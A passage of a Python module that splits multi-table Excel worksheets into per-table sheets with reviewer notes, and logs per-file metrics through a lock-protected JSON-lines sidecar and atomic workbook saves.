                start_row=merged_range.min_row - row_start + 1 + row_offset,
                start_column=merged_range.min_col - col_start + 1,
                end_row=merged_range.max_row - row_start + 1 + row_offset,
                end_column=merged_range.max_col - col_start + 1,
            )

    for c in range(col_start, col_end + 1):
        letter_src = get_column_letter(c)
        dim = src_ws.column_dimensions.get(letter_src)
        if dim is not None and dim.width is not None:
            letter_dest = get_column_letter(c - col_start + 1)
            dest_ws.column_dimensions[letter_dest].width = dim.width

    for r in range(row_start, row_end + 1):
        dim = src_ws.row_dimensions.get(r)
        if dim is not None and dim.height is not None:
            dest_ws.row_dimensions[r - row_start + 1 + row_offset].height = dim.height


def _table_has_header(ws, region: tuple[int, int, int, int]) -> bool:
    """True if a table's own first row is a header row -- a simple type-based
    heuristic, not the content-pattern (SSN/date/phone/dollar-amount) scoring
    excel_pipeline_3's stage1_multitable.py uses, deliberately -- see the
    module docstring on why this script avoids that approach. A genuine
    column-label row is written as text even when the data below it is
    numeric, so any non-empty, non-text cell (a number, date, or boolean) in
    the row means it's already data, not labels."""
    row_start, _row_end, col_start, col_end = region
    saw_value = False
    for c in range(col_start, col_end + 1):
        value = ws.cell(row=row_start, column=c).value
        if _empty(value):
            continue
        saw_value = True
        if not isinstance(value, str):
            return False
    return saw_value


def _write_synthetic_header(ws, row: int, num_cols: int) -> None:
    """Write a placeholder "column 1", "column 2", ... "column N" row (see
    _table_has_header) into `row` of a table with no header row of its own."""
    for i in range(1, num_cols + 1):
        ws.cell(row=row, column=i, value=f"column {i}")


def _write_external_header(ws, row: int, header_by_col: dict[int, str], table_col_start: int) -> None:
    """Write real header text (see detect_tables' own header-fusion check /
    _build_header_dict) into `row`, in place of _write_synthetic_header's
    generic "column N" placeholders -- used when a table's header came from
    the row-block immediately above it rather than from its own first row.
    header_by_col keys are the ORIGINAL sheet's 1-indexed columns; table_
    col_start is that table's own original c0, so a key is rebased the same
    way _copy_region rebases the table's own data (column - table_col_start
    + 1). A column with no entry in header_by_col (no value anywhere in the
    source header rows -- e.g. an unlabeled running-count column) is simply
    left blank here, matching the source rather than inventing a label."""
    for col, text in header_by_col.items():
        ws.cell(row=row, column=col - table_col_start + 1, value=_sanitize_cell_value(text))


def _write_detected_via_note(ws, reason: str, original_sheet_name: str) -> None:
    """Write doc_reader_v2.py's "Detected via: ..." note into cell A1 (see
    module docstring) -- reason says whether this sheet's table came from
    splitting a multi-table sheet or was already a single-table sheet."""
    note = f"Detected via: {reason}  |  {DOCUMENT_TYPE} | {original_sheet_name}"
    note_cell = ws.cell(row=1, column=1, value=note)
    note_cell.font = Font(italic=True, color="666666", size=9)

    col_letter = get_column_letter(1)
    needed_width = min(max(len(note) + 2, 8), 60)
    existing_width = ws.column_dimensions[col_letter].width
    if not existing_width or existing_width < needed_width:
        ws.column_dimensions[col_letter].width = needed_width


def _write_additional_context_note(ws, context_text: str) -> None:
    """Write a table's associated context (title/caption/date-stamp fragment
    matched by _match_context_fragments) into cell B1 -- the same "Additional
    context" B1 convention doc_reader_v2.py uses for a table's own title/
    surrounding text (see its _write_table_to_sheet), so a reviewer sees it
    right next to the "Detected via" note in A1 instead of on a separate
    Reviewer Note sheet."""
    context_cell = ws.cell(row=1, column=2, value=_sanitize_cell_value(context_text))
    context_cell.font = Font(italic=True, color="666666", size=9)
    context_cell.alignment = Alignment(wrap_text=True, vertical="top")

    col_letter = get_column_letter(2)
    needed_width = min(max(len(context_text) + 2, 8), 60)
    existing_width = ws.column_dimensions[col_letter].width
    if not existing_width or existing_width < needed_width:
        ws.column_dimensions[col_letter].width = needed_width


def _rebuild_sheet(
    wb,
    name: str,
    tables: list[tuple[int, int, int, int]],
    existing_names: set[str],
    context_by_region: dict[tuple[int, int, int, int], str] | None = None,
    external_headers_by_region: dict[tuple[int, int, int, int], dict[int, str]] | None = None,
) -> None:
    """Replace sheet `name` in `wb` (in place) with one new sheet per detected
    table, each named "Table_N (name)" and carrying a "Detected via" note in
    A1 (see _write_detected_via_note) -- matching doc_reader_v2.py's parsed
    per-table sheet + note convention. A sheet with zero detected tables (too
    small a fragment, a merged cell, an image, or genuinely no data at all)
    is instead REMOVED from `wb` outright -- the intermediate output is meant
    to hold only genuine parsed tables plus the "Reviewer Note" sheet (see
    _write_skipped_fragments_sheet), never a leftover native sheet that
    process_file already decided not to parse; whatever that sheet
    contained, or why it was skipped, is already recorded there (via
    process_file's own skipped_per_sheet bookkeeping) rather than by leaving
    the sheet itself sitting in the output for a reviewer to stumble across.

    existing_names is rebuild_workbook's single shared set of sheet names
    (see _unique_sheet_name) -- passed straight through rather than derived
    here, so it stays the one set built once for the whole rebuild."""
    if not tables:
        wb.remove(wb[name])
        return
    ws = wb[name]
    base_idx = wb.sheetnames.index(name)
    reason = MULTI_TABLE_REASON if len(tables) > 1 else SINGLE_TABLE_REASON
    context_by_region = context_by_region or {}
    external_headers_by_region = external_headers_by_region or {}
    for i, (r0, r1, c0, c1) in enumerate(tables, start=1):
        new_name = _unique_sheet_name(existing_names, f"Table_{i} ({name})")
        new_ws = wb.create_sheet(new_name, base_idx + i)
        external_header = external_headers_by_region.get((r0, r1, c0, c1))
        # A table with an external header (see detect_tables' own
        # header-fusion check) never has a header row of its own to begin
        # with -- its region is pure data, the header came from a separate
        # row-block entirely -- so it's treated the same as "no native
        # header" for the content_offset/copy purposes below, just with real
        # fused text instead of _write_synthetic_header's generic
        # placeholders.
        has_header = False if external_header else _table_has_header(ws, (r0, r1, c0, c1))
        # Row 1 is always the "Detected via" note. When the table brings its
        # own header row, that row lands on row 2 same as always (offset 1).
        # When it doesn't, row 2 is reserved for the synthetic/external header
        # instead and the table's own content shifts down one more row
        # (offset 2).
        content_offset = 1 if has_header else 2
        _copy_region(ws, new_ws, r0, r1, c0, c1, row_offset=content_offset)
        if external_header:
            _write_external_header(new_ws, row=2, header_by_col=external_header, table_col_start=c0)
        elif not has_header:
            _write_synthetic_header(new_ws, row=2, num_cols=c1 - c0 + 1)
        _write_detected_via_note(new_ws, reason, name)
        context_text = context_by_region.get((r0, r1, c0, c1))
        if context_text:
            _write_additional_context_note(new_ws, context_text)
    wb.remove(ws)


def rebuild_workbook(
    wb,
    tables_per_sheet: dict[str, list[tuple[int, int, int, int]]],
    context_per_sheet: dict[str, dict[tuple[int, int, int, int], str]] | None = None,
    external_headers_per_sheet: dict[str, dict[tuple[int, int, int, int], dict[int, str]]] | None = None,
) -> None:
    """Apply _rebuild_sheet to every sheet in `wb` (in place) -- every sheet
    that had at least one detected table ends up single-table, renamed, and
    noted, regardless of whether the whole workbook is classified single- or
    multi-table overall (see process_file); every sheet that had NONE is
    removed from `wb` outright (see _rebuild_sheet), so the only sheets left
    once this returns are genuine per-table sheets -- callers add the
    "Reviewer Note" sheet on top of that afterward (see
    _write_skipped_fragments_sheet).

    existing_names is built ONCE here (see _unique_sheet_name) and threaded
    through every _rebuild_sheet call below, rather than each of the N
    detected tables across every sheet independently rebuilding
    set(wb.sheetnames) -- itself O(sheet count) -- from scratch: that made a
    full rebuild O(N^2) in the total number of detected tables."""
    context_per_sheet = context_per_sheet or {}
    external_headers_per_sheet = external_headers_per_sheet or {}
    existing_names = set(wb.sheetnames)
    for name in list(wb.sheetnames):
        _rebuild_sheet(
            wb, name, tables_per_sheet.get(name, []), existing_names,
            context_per_sheet.get(name), external_headers_per_sheet.get(name),
        )


def _write_skipped_fragments_sheet(
    wb,
    skipped_per_sheet: dict[str, list[tuple[tuple[int, int, int, int], str, str]]],
    existing_names: set[str],
) -> None:
    """Insert a "Reviewer Note" sheet at the front of `wb` listing every
    detected block that was too small to count as a real table (see
    MIN_TABLE_ROWS), plus a row for every sheet skipped outright for
    containing a merged cell and/or an image (see process_file's own
    per-sheet gate) -- e.g. a lone date or label sitting near a real table,
    or an entire sheet that was never even run through detect_tables. This
    output workbook's other sheets only ever contain genuine tables; this
    sheet is where anything excluded from that shows up instead of silently
    disappearing. No-op if nothing was skipped.

    Each fragment now carries its OWN reason string (region, preview, reason)
    rather than one reason hardcoded for every row -- the different cases
    above ("too small", "sheet has a merged cell", "sheet has an image", or
    both of the latter at once) each need their own text, and a single
    shared reason_text would have described the merged-cell/image cases
    wrongly as a row-count problem.

    "Reviewer Note" -- same name doc_reader_v2.py uses for its own PDF-side
    equivalent -- is routed through _unique_sheet_name(existing_names, ...)
    like every other sheet this module creates, rather than passed straight
    to wb.create_sheet(): a name collision (a source workbook that already
    has its own sheet called "Reviewer Note") would otherwise be resolved
    silently by openpyxl into "Reviewer Note1", with nothing pointing a
    reviewer at that renamed sheet instead of the one they're looking for."""
    if not skipped_per_sheet:
        return
    sheet_name = _unique_sheet_name(existing_names, "Reviewer Note")
    ws = wb.create_sheet(sheet_name, 0)

    header = ["Reviewer Note-Original Sheet", "Cell Range", "Reason", "Sample Content"]
    ws.append(header)
    for cell in ws[1]:
        cell.font = Font(bold=True)

    # Collected as each row is appended -- see the width computation below,
    # which uses these rather than reading them back off `ws`.
    all_rows = [header]
    for sheet_name, fragments in skipped_per_sheet.items():
        for region, preview, reason_text in fragments:
            row_start, row_end, col_start, col_end = region
            cell_range = (
                f"{get_column_letter(col_start)}{row_start}:"
                f"{get_column_letter(col_end)}{row_end}"
            )
            row = [sheet_name, cell_range, reason_text, _sanitize_cell_value(preview)]
            ws.append(row)
            all_rows.append(row)

    # Computed from all_rows (already in hand from the loop above) in a
    # single pass, rather than the previous
    # `[max(... for row in ws.iter_rows(values_only=True)) for i in range(len(header))]`
    # -- that rebuilt and fully consumed ws.iter_rows() once per column (4
    # columns -> the whole sheet walked 4 times), re-reading and
    # materializing cells back off a normal-mode worksheet for data this
    # function already had on hand.
    widths = [0] * len(header)
    for row in all_rows:
        for i, value in enumerate(row):
            widths[i] = max(widths[i], len(str(value)))
    for i, width in enumerate(widths, start=1):
        ws.column_dimensions[get_column_letter(i)].width = min(max(width + 2, 10), 60)


# --------------------------------------------------------------------------
# Orchestration
# --------------------------------------------------------------------------

def collect_input_files(folder: Path) -> list[Path]:
    files = []
    for p in folder.glob("*"):
        if not p.is_file():
            continue
        if p.suffix.lower() not in _SUPPORTED_SUFFIXES:
            continue
        if p.name.startswith("~$"):
            continue
        files.append(p)
    return sorted(files)


_NUMBERED_DEST_SUFFIX_RE = re.compile(r"^(.*) \((\d+)\)$")


def _highest_existing_dest_suffix(dest_dir: Path, stem: str, suffix: str) -> int:
    """Scan dest_dir ONCE (a single directory listing) to find the highest
    already-used " (N)" numbered variant of stem+suffix -- lets
    _unique_dest's reservation loop seed its counter just past whatever's
    already there, instead of walking up one number at a time via a failed
    os.open() syscall for every number already taken.

    Re-running this script into an already-populated output folder meant
    the k-th file needing a reservation cost k probes (each a real
    filesystem syscall) -- on the order of 125,000 calls for a 500-file
    re-run -- negligible on local disk but noticeable on the network share
    an approved-storage output folder likely lives on. A single listing
    here turns that into O(1) probes plus one directory read per file
    needing a reservation at all (the common case -- the plain name being
    free -- still costs nothing extra, since this is only called after that
    first attempt already collided).

    Returns 1 if there's nothing to skip past (dest_dir doesn't exist yet,
    or no numbered variant of this exact stem is present) -- the caller's
    own probe of " (2)" still happens the normal way in that case."""
    highest = 1
    try:
        entries = os.listdir(dest_dir)
    except OSError:
        return highest
    for entry_name in entries:
        entry_path = Path(entry_name)
        if entry_path.suffix != suffix:
            continue
        m = _NUMBERED_DEST_SUFFIX_RE.match(entry_path.stem)
        if m and m.group(1) == stem:
            try:
                n = int(m.group(2))
            except ValueError:
                continue
            if n > highest:
                highest = n
    return highest


def _unique_dest(dest_dir: Path, name: str) -> Path:
    """Atomically claim a destination path in dest_dir that doesn't collide
    with an existing file, even across two concurrently running instances of
    this script writing into the same folder -- auto-renaming with a
    " (2)", " (3)", ... suffix, same convention as sort_files_by_type.py /
    extract_files_by_extension.py in this repo.

    A plain "does candidate exist? if not, use it" check (the previous
    implementation of this function) is a textbook check-then-act race: two
    processes can both see the same free candidate and both proceed to write
    it, with the loser's write silently clobbering the winner's. os.O_CREAT |
    os.O_EXCL asks the OS to create-or-fail atomically, so at most one
    process can ever win a given candidate name; every other racer gets
    FileExistsError and moves on to the next candidate instead of clobbering.
    Mirrors doc_reader_v2.py's own _reserve_unique_destination.

    Returns a path to an already-created (empty) file -- the caller must
    save/write into that same path (process_file's wb.save(dest) does),
    never re-resolve a fresh one, or the reservation is pointless."""
    dest_dir.mkdir(parents=True, exist_ok=True)
    stem, suffix = Path(name).stem, Path(name).suffix
    candidate = dest_dir / name
    n = None
    while True:
        try:
            fd = os.open(candidate, os.O_CREAT | os.O_EXCL | os.O_WRONLY)
            os.close(fd)
            return candidate
        except FileExistsError:
            if n is None:
                # First collision -- one directory listing seeds n just past
                # whatever's already there (see _highest_existing_dest_suffix)
                # instead of starting the walk at 2 and re-discovering each
                # already-used number one failed os.open() at a time.
                n = _highest_existing_dest_suffix(dest_dir, stem, suffix) + 1
            else:
                n += 1
            candidate = dest_dir / f"{stem} ({n}){suffix}"


# --------------------------------------------------------------------------
# Metrics log -- mirrors doc_reader_v2.py's own MetricsWriter (duplicated
# here, not imported, so importing this module never pulls in
# doc_reader_v2.py's heavy Azure Document Intelligence / Azure OpenAI SDK
# dependencies -- see triage_pipeline.py's own docstring on why it imports
# split_tables.py directly but only ever subprocess's doc_reader_v2.py).
# --------------------------------------------------------------------------

EXCEL_METRICS_SHEET_NAME = "Excel Parsing"
EXCEL_METRICS_COLUMNS = [
    "Timestamp (UTC)",
    "File Name",
    "File Size (KB)",
    "Tables Found",
    "Run Time (s)",
    "Status",
    "Error",
    "Notes",
]


def _style_header_row(ws, row: int = 1) -> None:
    fill = PatternFill(start_color="000080", end_color="000080", fill_type="solid")
    font = Font(color="FFFFFF", bold=True)
    align = Alignment(horizontal="center", vertical="center")
    for cell in ws[row]:
        cell.fill = fill
        cell.font = font
        cell.alignment = align


def _autosize_columns_from_rows(ws, rows: list, preserve_existing: bool = False) -> None:
    """Sizes ws's columns from row VALUES already in hand, not by reading
    them back off the sheet -- see doc_reader_v2.py's own
    _autosize_columns_from_rows for why (ws.cell() instantiates a real,
    stored Cell for any coordinate it's asked about, so autosizing via
    ws.columns/iter_cols on a large sparse sheet -- exactly what a
    long-running metrics log is -- inflates it to its full dense size).
    preserve_existing treats a column's already-set width as a floor rather
    than overwriting it, so metrics.xlsx's width still reflects its full
    accumulated history without this call ever reading a historical cell
    back; it can only grow to fit newly appended rows, never shrink."""
    max_lens: dict[int, int] = {}
    for row in rows:
        for idx, value in enumerate(row):
            if value is None:
                continue
            length = len(str(value))
            if length > max_lens.get(idx, 0):
                max_lens[idx] = length

    for idx, max_len in max_lens.items():
        col_letter = get_column_letter(idx + 1)
        width = min(max(max_len + 2, 8), 60)
        if preserve_existing:
            existing = ws.column_dimensions[col_letter].width
            if existing:
                width = max(width, existing)
        ws.column_dimensions[col_letter].width = width


def _safe_save_workbook(wb, path: Path) -> None:
    """Write wb to a .tmp sibling, then atomically rename to path -- retried
    on PermissionError (e.g. metrics.xlsx open in Excel) rather than losing
    the batch's rows outright. Mirrors doc_reader_v2.py's own _safe_save."""
    tmp = Path(str(path) + ".tmp")
    try:
        wb.save(tmp)
        for attempt in range(5):
            try:
                os.replace(tmp, path)
                return
            except PermissionError:
                if attempt < 4:
                    time.sleep(0.5)
                else:
                    raise
    except Exception:
        tmp.unlink(missing_ok=True)
        raise


_STALE_LOCK_SECONDS = 600  # 10 minutes -- far longer than append()/save() ever
                           # legitimately hold this lock (a JSON-line write or
                           # an xlsx consolidate). A lock still held this long
                           # almost certainly belongs to a process that was
                           # hard-killed (SIGKILL/crash/power loss) before its
                           # own `finally` below ever ran, not one still
                           # genuinely working -- see _reclaim_stale_lock.


def _pid_alive(pid: int) -> bool:
    """Best-effort liveness check for a PID recorded in a lock file.
    Dependency-free (no psutil) -- this is lock-file infrastructure, not
    part of the extraction task this module exists for (see this repo's own
    "minimal dependencies" convention). Any case this can't resolve
    confidently (permission error, a WinError on a since-reused handle,
    etc.) returns True -- treat "can't tell" as "still alive" so a live
    lock is never falsely reclaimed; _reclaim_stale_lock's age check is the
    backstop for exactly this "can't tell" case."""
    if pid <= 0:
        return False
    if sys.platform == "win32":
        import ctypes
        PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
        handle = ctypes.windll.kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
        if not handle:
            return False
        ctypes.windll.kernel32.CloseHandle(handle)
        return True
    try:
        os.kill(pid, 0)
    except ProcessLookupError:
        return False
    except OSError:
        return True
    return True


def _reclaim_stale_lock(lock_path: Path) -> bool:
    """True if `lock_path` was just removed because it belongs to a dead
    process or has outlived _STALE_LOCK_SECONDS -- both signs the run that
    created it was hard-killed before its own `finally` (see
    _metrics_file_lock) ever got to unlink it, rather than a peer run still
    legitimately working. A lock with unreadable/malformed content (e.g.
    left over from before this reclamation existed, or a torn write) is
    judged by the lock FILE's own mtime instead of its content. Racy by
    design and safe with it: if two processes both decide to reclaim the
    same stale lock at once, the loser's unlink() simply raises
    FileNotFoundError, which is treated as success -- either way the lock
    is gone and the caller retries os.open()."""
    try:
        content = lock_path.read_text(encoding="utf-8").strip()
    except OSError:
        return False  # already gone, or unreadable -- let the caller just retry os.open

    pid = None
    lock_time = None
    parts = content.split()
    if len(parts) == 2:
        try:
            pid = int(parts[0])
            lock_time = float(parts[1])
        except ValueError:
            pid = None

    if lock_time is None:
        try:
            lock_time = lock_path.stat().st_mtime
        except OSError:
            return False

    dead = pid is not None and not _pid_alive(pid)
    stale = (time.time() - lock_time) >= _STALE_LOCK_SECONDS
    if not (dead or stale):
        return False

    try:
        lock_path.unlink()
    except FileNotFoundError:
        pass  # another process already reclaimed it -- fine, the lock is gone either way
    except OSError:
        return False  # e.g. still held open elsewhere -- not actually reclaimed
    return True


@contextlib.contextmanager
def _metrics_file_lock(path: Path, timeout: float = 30.0, poll_interval: float = 0.1):
    """Advisory lock (sidecar `<path>.lock` file) serializing access to
    `path` across concurrently running processes -- same `<path>.lock`
    convention doc_reader_v2.py's own _file_lock uses, so the two stay
    mutually exclusive on metrics.xlsx itself even though each module
    implements its own copy of this lock rather than importing the other's.

    The lock file's content is "<pid> <time.time()>" (see
    _reclaim_stale_lock) rather than empty -- a hard-killed run's lock has
    no `finally` to ever unlink it, and without this, every later run would
    just block for the full timeout and then raise TimeoutError,
    self-inflicting a denial of service on metrics logging until someone
    manually deletes the file. _reclaim_stale_lock is tried on every
    contended acquisition (not just once the timeout is reached) so a
    dead/stale lock is cleared as soon as it's noticed, not only after
    already waiting out the full timeout."""
    lock_path = Path(str(path) + ".lock")
    deadline = time.monotonic() + timeout
    while True:
        try:
            fd = os.open(lock_path, os.O_CREAT | os.O_EXCL | os.O_WRONLY)
            with os.fdopen(fd, "w") as f:
                f.write(f"{os.getpid()} {time.time()}")
            break
        except FileExistsError:
            if _reclaim_stale_lock(lock_path):
                continue  # reclaimed -- retry os.open immediately, no need to wait
            if time.monotonic() >= deadline:
                raise TimeoutError(
                    f"Timed out waiting for lock on {path} -- if no other run is "
                    f"active, delete the stale lock file at {lock_path}."
                )
            time.sleep(poll_interval)
    try:
        yield
    finally:
        lock_path.unlink(missing_ok=True)


class ExcelMetricsWriter:
    """Durably logs one row per processed Excel file to the "Excel Parsing"
    sheet of a target workbook (e.g. triage_pipeline.py's combined
    metrics.xlsx, sitting alongside doc_reader_v2.py's own "PDF Parsing"
    sheet in the SAME file) -- mirrors doc_reader_v2.py's MetricsWriter
    append-then-consolidate durability pattern:

    append() writes each row IMMEDIATELY to a small JSON-Lines sidecar file
    (<path>.excel_metrics.pending.jsonl) -- open, write one line, close --
    so a row is durable against a mid-batch crash without ever touching the
    xlsx itself. save() consolidates every pending row into the workbook
    with a single load + rewrite, loading the WHOLE workbook first so any
    other sheet already in it (doc_reader_v2.py's own "PDF Parsing" sheet)
    is read back and saved right along with this sheet's own update,
    untouched -- and only clears the sidecar once that write has actually
    succeeded, so a failed save() (e.g. metrics.xlsx open in Excel) leaves
    every pending row intact for the next save() to pick up.

    The sidecar filename is qualified with "excel_metrics" (unlike
    doc_reader_v2.py's own unqualified <path>.pending.jsonl) specifically
    because this writer and doc_reader_v2.py's MetricsWriter can both target
    the exact same metrics.xlsx path at once -- without that qualifier the
    two would silently share (and corrupt) one sidecar."""

    def __init__(self, path: Path):
        self._path = path
        self._sidecar_path = Path(str(path) + ".excel_metrics.pending.jsonl")

    def append(self, **fields) -> None:
        row = [fields.get(col, "") for col in EXCEL_METRICS_COLUMNS]
        self._sidecar_path.parent.mkdir(parents=True, exist_ok=True)
        with _metrics_file_lock(self._sidecar_path):
            with open(self._sidecar_path, "a", encoding="utf-8") as f:
                f.write(json.dumps(row) + "\n")

    def _load_or_create_sheet(self):
        if self._path.exists():
            wb = openpyxl.load_workbook(self._path)
            if EXCEL_METRICS_SHEET_NAME in wb.sheetnames:
                ws = wb[EXCEL_METRICS_SHEET_NAME]
            else:
                ws = wb.create_sheet(EXCEL_METRICS_SHEET_NAME)
                ws.append(EXCEL_METRICS_COLUMNS)
                _style_header_row(ws)
        else:
            self._path.parent.mkdir(parents=True, exist_ok=True)
            wb = openpyxl.Workbook()
            ws = wb.active
            ws.title = EXCEL_METRICS_SHEET_NAME
            ws.append(EXCEL_METRICS_COLUMNS)
            _style_header_row(ws)
        return wb, ws

    def _read_pending_rows(self) -> list[list]:
        """Read (but do not clear) the sidecar. Caller must already hold
        _metrics_file_lock(self._sidecar_path) for the entire
        read-through-clear lifecycle -- see save()."""
        if not self._sidecar_path.exists():
            return []
        with open(self._sidecar_path, "r", encoding="utf-8") as f:
            return [json.loads(line) for line in f if line.strip()]

    def save(self) -> None:
        self._sidecar_path.parent.mkdir(parents=True, exist_ok=True)
        with _metrics_file_lock(self._sidecar_path):
            pending_rows = self._read_pending_rows()
            if not pending_rows:
                return

            with _metrics_file_lock(self._path):
                wb, ws = self._load_or_create_sheet()
                for row in pending_rows:
                    ws.append(row)
                _autosize_columns_from_rows(ws, pending_rows, preserve_existing=True)
                _safe_save_workbook(wb, self._path)

            self._sidecar_path.unlink(missing_ok=True)
            wb.close()


def _protected_sheet_names(wb) -> list[str]:
    """Names of every sheet in `wb` with Excel's own "Protect Sheet" turned on
    -- editing, and critically un-hiding a hidden row/column/sheet, is locked
    (whether or not a password was actually set on it; ws.protection.sheet is
    True either way). openpyxl still reads a protected sheet's cells fine --
    protection only gates writing, in Excel itself, not this module's own
    read-only pass -- but that's exactly the danger: this module would read
    back and confidently reformat whatever's visible while having no way to
    tell whether a hidden row/column on that same sheet (which protection
    exists specifically to keep a casual user from un-hiding) holds more
    data that never makes it into the output at all. Returns [] if nothing
    on this workbook is protected.

    Only checks worksheet-level protection (ws.protection.sheet), not
    workbook-level structure protection (wb.security.lockStructure) -- the
    latter only blocks adding/removing/reordering/hiding entire sheets, not
    hiding rows or columns within one, so it doesn't carry the same
    "content might be hidden under here" risk this check exists for.

    Only meaningful for .xlsx/.xlsm -- opened via openpyxl.load_workbook
    directly, so the real ws.protection openpyxl parsed from the file is
    still attached. .xls/.xlsb/.csv are all converted to a brand new
    in-memory openpyxl Workbook first (see open_any_workbook) that carries
    values only, same as it never carries styles/formatting for those
    formats either -- so a protected legacy .xls/.xlsb always reads back as
    unprotected here, and this check silently can't catch it."""
    return [ws.title for ws in wb.worksheets if ws.protection.sheet]


def _sheet_has_images(ws) -> bool:
    """True if `ws` has at least one embedded image -- an image floating over
    cells can visually BE the actual content a reviewer needs (a scanned
    signature, a screenshotted chart, a photo), none of which detect_tables'
    purely geometric cell-occupancy scan has any way to read; a sheet with an
    image is routed to manual review the same way a merged-cell sheet is
    (see process_file's own per-sheet gate), rather than silently parsing
    whatever ordinary cell data happens to sit elsewhere on that same sheet
    and leaving the image itself unaccounted for.

    openpyxl exposes a loaded worksheet's images only via the private
    ws._images list -- there's no public API for reading them back off an
    already-loaded sheet. Any AttributeError (a future openpyxl version
    renaming or removing that attribute) is treated as "no images detected"
    rather than crashing the batch, the same private-API fallback
    _true_sheet_extent already takes for ws._cells.

    Only meaningful for .xlsx/.xlsm, same caveat as _protected_sheet_names:
    .xls/.xlsb/.csv are all converted to a brand new in-memory openpyxl
    Workbook first (see open_any_workbook) that never carries images across
    that conversion either, so an image on a legacy .xls/.xlsb sheet always
    reads back as image-free here, and this check silently can't catch it."""
    try:
        return bool(ws._images)
    except AttributeError:
        return False


class ProcessResult:
    """process_file's return value -- status is the short classification
    string every existing caller already switches on ("single", "multi",
    "error", "skipped", "protected", "no_tables" -- the last for a workbook
    where detect_tables found zero real tables on any sheet, see
    process_file's own total_tables == 0 branch); tables_found/note/error are
    the extra detail a caller wants to durably log to a metrics sheet (see
    triage_pipeline.py's stage2_process_excels and ExcelMetricsWriter below)
    without re-deriving it from the output file after the fact.

    dest is the path process_file actually saved the modified workbook to --
    set only on a "single"/"multi" result, None otherwise -- so a caller
    that needs to move/rename that output (see stage2_process_excels)
    consumes it directly instead of re-deriving it by diffing a directory
    listing taken before/after the call. That diffing approach had two real
    failure modes this field closes off: a "single"/"multi" result whose
    save somehow didn't produce a new file left the diff empty with nothing
    downstream to notice -- the file was still logged as "Parsed" with no
    workbook anywhere to show for it -- and diffing an arbitrary
    Path.stem + ".xlsx"-guessed name was never actually needed in the first
    place once process_file already knows its own dest.

    A plain class, not @dataclass -- this module is loaded via
    importlib.util.module_from_spec + exec_module without ever being
    registered into sys.modules (see triage_pipeline.py's own
    _load_split_tables), and @dataclass's field-processing looks up
    sys.modules[cls.__module__] to resolve annotations; on a module that was
    never registered there, that lookup returns None and dataclass() itself
    raises AttributeError before this class even finishes being defined."""

    def __init__(
        self, status: str, tables_found: int = 0, note: str = "", error: str = "",
        dest: Optional[Path] = None,
    ):
        self.status = status
        self.tables_found = tables_found
        self.note = note
        self.error = error
        self.dest = dest


def process_file(
    path: Path, single_dir: Path, modified_dir: Path, log_fn=print,
    temp_base_dir: Optional[Path] = None,
) -> ProcessResult:
    """Classify + act on one file. Returns a ProcessResult (see above).
    temp_base_dir is passed straight through to open_any_workbook (see its
    own docstring)."""
    try:
        wb = open_any_workbook(path, log_fn=log_fn, temp_base_dir=temp_base_dir)
    except ImportError as exc:
        log_fn(f"  SKIPPED (missing dependency): {exc}")
        return ProcessResult(status="skipped", error=str(exc))
    except Exception as exc:
        log_fn(f"  SKIPPED (could not open): {exc}")
        return ProcessResult(status="error", error=str(exc))

    protected = _protected_sheet_names(wb)
    if protected:
        wb.close()
        log_fn(
            f"  SKIPPED (protected sheet(s) -- needs manual review): {', '.join(protected)}"
        )
        return ProcessResult(status="protected", note=f"Protected sheet(s): {', '.join(protected)}")

    try:
        tables_per_sheet: dict[str, list[tuple[int, int, int, int]]] = {}
        context_per_sheet: dict[str, dict[tuple[int, int, int, int], str]] = {}
        skipped_per_sheet: dict[str, list[tuple[tuple[int, int, int, int], str, str]]] = {}
        external_headers_per_sheet: dict[str, dict[tuple[int, int, int, int], dict[int, str]]] = {}
        total_unmatched_fragments = 0
        for sheet_name in wb.sheetnames:
            ws = wb[sheet_name]

            has_merges = bool(ws.merged_cells.ranges)
            has_images = _sheet_has_images(ws)
            if has_merges or has_images:
                # A merged cell can make a purely geometric block look like a
                # real table when it isn't one (a wide "merge and center"
                # banner sitting next to an item number or a short side-note
                # reads, cell-by-cell, exactly like a real record) with no
                # reliable way to tell the two apart short of a human looking
                # at it -- so rather than keep chasing narrower and narrower
                # geometric heuristics for "is this merge just a banner or
                # part of a real table," any sheet with at least one merged
                # cell is not run through detect_tables at all. An image is
                # excluded for a different reason: it can BE the sheet's real
                # content (a scanned signature, a screenshotted chart) that
                # detect_tables' cell-occupancy scan has no way to read at
                # all, regardless of whether ordinary cell data also happens
                # to sit elsewhere on that same sheet -- see _sheet_has_images.
                # Either way tables_per_sheet[sheet_name] is left empty (this
                # sheet contributes zero tables) and a single whole-sheet row
                # is added to the Reviewer Note sheet instead of a
                # per-fragment one -- see _true_sheet_extent for why the
                # sheet's real populated extent (not ws.max_row/max_column,
                # which can be wildly inflated by mere formatting) is what's
                # reported as the cell range.
                phrases = []
                preview_bits = []
                if has_merges:
                    phrases.append(MERGED_CELL_PHRASE)
                    preview_bits.append(f"{len(ws.merged_cells.ranges)} merged cell range(s)")
                if has_images:
                    phrases.append(IMAGE_PHRASE)
                    preview_bits.append(f"{len(ws._images)} image(s)")
                max_row, max_col = _true_sheet_extent(ws)
                region = (1, max_row or 1, 1, max_col or 1)
                skipped_per_sheet[sheet_name] = [(
                    region,
                    f"{' and '.join(preview_bits)} on this sheet",
                    UNPARSEABLE_SHEET_REASON_TEMPLATE.format(phrases=" and ".join(phrases)),
                )]
                tables_per_sheet[sheet_name] = []
                skip_reason = "contains merged cell(s)" if has_merges and not has_images else (
                    "contains image(s)" if has_images and not has_merges else
                    "contains merged cell(s) and image(s)"
                )
                log_fn(f"    {sheet_name:<28} : not parsed ({skip_reason})")
                continue

            tables, skipped, external_headers = detect_tables(ws, log_fn=log_fn)
            if external_headers:
                external_headers_per_sheet[sheet_name] = external_headers

            # Previews captured now, from the original sheet -- rebuild_workbook
            # below may replace or remove this sheet object before this data is
            # written out (see _write_skipped_fragments_sheet /
            # _write_additional_context_note). A fragment matched to a table
            # (see _match_context_fragments) becomes that table's "Additional
            # context" instead of a Reviewer Note row.
            context_by_table, unmatched = _match_context_fragments(tables, skipped)
            total_unmatched_fragments += len(unmatched)

            if len(unmatched) >= MAX_SKIPPED_FRAGMENTS_PER_SHEET:
                # This many disconnected too-small fragments on one sheet is
                # treated as a sign the sheet itself is too unreliable to
                # trust -- any real table detect_tables also found here is
                # discarded too (tables_per_sheet left empty, same as the
                # merged-cell/image gate above), rather than surfacing a
                # table that sits among that much surrounding noise as if it
                # were clean data. Reported as ONE consolidated Reviewer Note
